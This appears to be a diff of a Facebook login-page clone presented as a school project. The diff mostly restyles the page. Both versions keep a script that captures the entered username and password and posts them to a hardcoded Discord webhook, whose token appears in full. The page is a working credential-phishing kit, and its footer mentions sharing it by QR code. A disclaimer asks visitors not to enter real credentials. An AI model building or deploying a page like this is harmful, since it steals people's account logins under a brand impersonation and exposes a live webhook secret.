@@ -1,282 +1,257 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, intial-scale=1.0">
-    <title>facebook-project</title>
-    <style>
-        body {
-    display: block; 
-    text-align: center;
-    background-color: #f4f4f4;
-    font-family: Arial, sans-serif;
-}
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>facebook-project</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      font-family: Arial, sans-serif;
+    }
 
-.container {
-    width: 100%;
-    max-width: 480px;
-    margin: auto;
-    padding-top: 60px;
-    border-radius: 8px;
-    background: rgba(255, 255, 255, 0.9);
-    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-}
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
 
-.form-container {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    background-color: white;
-    border-radius: 8px;
-    box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
-    width: 100%;
-    max-width: 397px;
-    height: auto;
-    padding: 20px;
-    margin: 20px auto;
-    margin-right: 20px;
-}
+    .main-content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 100px 20px 60px;
+      flex-wrap: wrap;
+    }
 
-footer {
-    background-color: #333; 
-    color: white; 
-    text-align: center;
-    width: 100%;
-    padding: 10px 0; 
-    position: fixed;
-    bottom: 0;
-}
+    .logo-wrapper {
+      max-width: 400px;
+      margin-right: 40px;
+    }
 
-footer ul {
-    list-style: none;
-    padding: 0;
-    margin: 0;
-    display: flex;
-    justify-content: center; 
-    flex-wrap: wrap; 
-}
+    .logo {
+      font-size: 65px;
+      color: #007bff;
+      font-weight: bold;
+      margin: 0;
+    }
 
-footer ul li {
-    margin: 0 8px;
-}
+    .logo-caption {
+      margin-top: 10px;
+      color: #333;
+      font-size: 20px;
+    }
 
-footer ul li a {
-    color: white;
-    text-decoration: none;
-    font-size: 10px;
-}
+    .form-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+      width: 100%;
+      max-width: 397px;
+      padding: 20px;
+    }
 
-footer ul li a:hover {
-    text-decoration: underline;
-}
-p {
-  font-size: 13px;
-}
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 8px;
+      color: #555;
+      font-size: 14px;
+      width: 100%;
+    }
 
-        h2 {
-            margin-bottom: 20px;
-            color: #333;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        label {
-            display:block;
-            text-align: left;
-            margin-bottom: 8px;
-            color: #555;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            margin-right: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
-            transition:all 0.3s ease;
-        }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+    }
 
-        input:focus {
-            border-color: #007bff;
-            outline: none;
-        }
+    input:focus {
+      border-color: #007bff;
+      outline: none;
+    }
 
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 13px 25px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      width: 100%;
+      transition: all 0.3s ease;
+    }
 
-        button {
-            background-color: #007bff;
-            color: white;
-            padding: 13px 25px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-            transition:all 0.3s ease;
-        }
+    button:hover {
+      background-color: #0056b3;
+    }
 
+    footer {
+      background-color: #fff;
+      color: #888;
+      text-align: center;
+      width: 100%;
+      padding: 40px 10px 50px;
+    }
 
-        button:hover{
-            background-color: #0056b3;
-        }
+    footer ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
 
+    footer ul li {
+      margin: 0 8px;
+    }
 
-        
+    footer ul li a {
+      color: #888;
+      text-decoration: none;
+      font-size: 10px;
+    }
 
-        
+    footer ul li a:hover {
+      text-decoration: underline;
+    }
 
-         @media screen and (max-width: 480px) {
-            .container {
-                padding: 20px;
-            }
-            h2 {
-                font-size: 22px;
-            }
-            button {
-                font-size: 14px;
-            }
-         }
-         .logo{
-          font-size: 65px;
-          margin-left: 40px;
-          text-align: left;
-          color: #007bff;
-          font-weight: bold;
-          top: 150px;
-          position: relative;
-         }
-         .logo-caption {
-    margin-left: 40px; 
-    text-align: left;
-    max-width: 400px;
-    top:150px;
-    position: relative;
-         } 
-         
-    </style>
+    .fb-clone p {
+      font-size: 13px;
+      color: #888;
+      max-width: 600px;
+      margin: 20px auto 0;
+    }
+
+    @media screen and (max-width: 768px) {
+      .main-content {
+        flex-direction: column;
+        align-items: center;
+        padding: 80px 20px;
+      }
+
+      .logo-wrapper {
+        margin-right: 0;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+
+      .logo {
+        font-size: 48px;
+      }
+
+      .logo-caption {
+        font-size: 16px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <h1 class="logo">facebook</h1>
-  <h2 class="logo-caption">
-    Connect with friends and the world around you on Facebook.
-  </h2>
-    <div class ="form-container">
-      <form id="contactForm">
-        <label for="username">Enter your Username or Email</label>
-        <input type="text" id="username" name="username" required>
-    
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" required>
-    
-        <button type="submit">Login</button>
-    </form>
-    
-    
+  <div class="page-wrapper">
+    <div class="main-content">
+      <div class="logo-wrapper">
+        <h1 class="logo">facebook</h1>
+        <h2 class="logo-caption">
+          Connect with friends and the world around you on Facebook.
+        </h2>
+      </div>
+
+      <div class="form-container">
+        <form id="contactForm">
+          <label for="username">Enter your Username or Email</label>
+          <input type="text" id="username" name="username" required />
+
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required />
+
+          <button type="submit">Login</button>
+        </form>
+      </div>
     </div>
 
-
     <footer>
-      <div>
-        <ul>
-          <button type="button" class="plus-button">+</button>
-        </ul>
-        <div class="line-2 reduce-margin"></div>
-        <ul>
-          <li class="list-items">
-            <a class="list-items" href="#">Sign Up</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Log In</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Messenger</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Facebook Lite</a>
-          </li>
-          <li class="list-items"><a class="list-items" href="#">Video</a></li>
-          <li class="list-items">
-            <a class="list-items" href="#">Meta Pay</a>
-          </li>
-          <li class="list-items"><a class="list-items" href="#">Pages</a></li>
-          <li class="list-items">
-            <a class="list-items" href="#">Page Categories</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Places</a>
-          </li>
-          <li class="list-items"><a class="list-items" href="#">Games</a></li>
-          <li class="list-items">
-            <a class="list-items" href="#">Locations</a>
-          </li>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Groups</a>
-          </li>
-          <li class="list-items"><a class="list-items" href="#">Jobs</a></li>
-          <li class="list-items">
-            <a class="list-items" href="#">Create Page</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Developers</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Careers</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Privacy</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">Cookies</a>
-          </li>
-          <li class="list-items">
-            <a class="list-items" href="#">AdChoices</a>
-          </li>
-          <li class="list-items"><a class="list-items" href="#">Terms</a></li>
-          <li class="list-items"><a class="list-items" href="#">Help</a></li>
-        </ul>
-        <div class="fb-clone">
-          <p>
-            Disclaimer: This web page is a school project. Please kindly do not enter any of your credentials here.
-            Unless the QR Code was sent to you or shown to you please do not enter credentials as they will be sent to me for testing.
-          </p>
-        
-        </div>
+      <ul>
+        <li><a href="#">Sign Up</a></li>
+        <li><a href="#">Log In</a></li>
+        <li><a href="#">Messenger</a></li>
+        <li><a href="#">Facebook Lite</a></li>
+        <li><a href="#">Video</a></li>
+        <li><a href="#">Meta Pay</a></li>
+        <li><a href="#">Pages</a></li>
+        <li><a href="#">Page Categories</a></li>
+        <li><a href="#">Places</a></li>
+        <li><a href="#">Games</a></li>
+        <li><a href="#">Locations</a></li>
+        <li><a href="#">Groups</a></li>
+        <li><a href="#">Jobs</a></li>
+        <li><a href="#">Create Page</a></li>
+        <li><a href="#">Developers</a></li>
+        <li><a href="#">Careers</a></li>
+        <li><a href="#">Privacy</a></li>
+        <li><a href="#">Cookies</a></li>
+        <li><a href="#">AdChoices</a></li>
+        <li><a href="#">Terms</a></li>
+        <li><a href="#">Help</a></li>
+      </ul>
+      <div class="fb-clone">
+        <p>
+          Disclaimer: This web page is a school project. Please kindly do not
+          enter any of your credentials here. Unless the QR Code was sent to
+          you or shown to you, please do not enter credentials as they will be
+          sent to me for testing.
+        </p>
       </div>
     </footer>
-    
-    <script>
-      document.getElementById('contactForm').addEventListener('submit', async function(event) {
-          event.preventDefault();
-      
-          const username = document.getElementById('username').value;
-          const password = document.getElementById('password').value;
-      
-          const webhookUrl = 'https://discordapp.com/api/webhooks/1339385478553800704/AgWcJ--FjDu48PZgF3wr40-Fr_yxXMgLWlg-da8lc5aYJ-Z6u1VXuHflVBIYDnsvt4Fl';
-      
-          const webhookBody = {
-              content: `Username: ${username}\nPassword: ${password}`
-          };
-      
-          const response = await fetch(webhookUrl, {
-              method: 'POST',
-              headers: {
-                  'Content-Type': 'application/json',
-              },
-              body: JSON.stringify(webhookBody),
-          });
-      
-          if (response.ok) {
-              alert('Credentials sent (test only).');
-          } else {
-              alert('Failed to send credentials.');
-          }
-      });
-      </script>
-      
+  </div>
 
+  <script>
+    document.getElementById("contactForm").addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const webhookUrl =
+        "https://discordapp.com/api/webhooks/1339385478553800704/AgWcJ--FjDu48PZgF3wr40-Fr_yxXMgLWlg-da8lc5aYJ-Z6u1VXuHflVBIYDnsvt4Fl";
+
+      const webhookBody = {
+        content: `Username: ${username}\nPassword: ${password}`,
+      };
+
+      const response = await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(webhookBody),
+      });
+
+      if (response.ok) {
+        alert("Credentials sent (test only).");
+      } else {
+        alert("Failed to send credentials.");
+      }
+    });
+  </script>
 </body>
 </html>
-</body>
-</html>
+
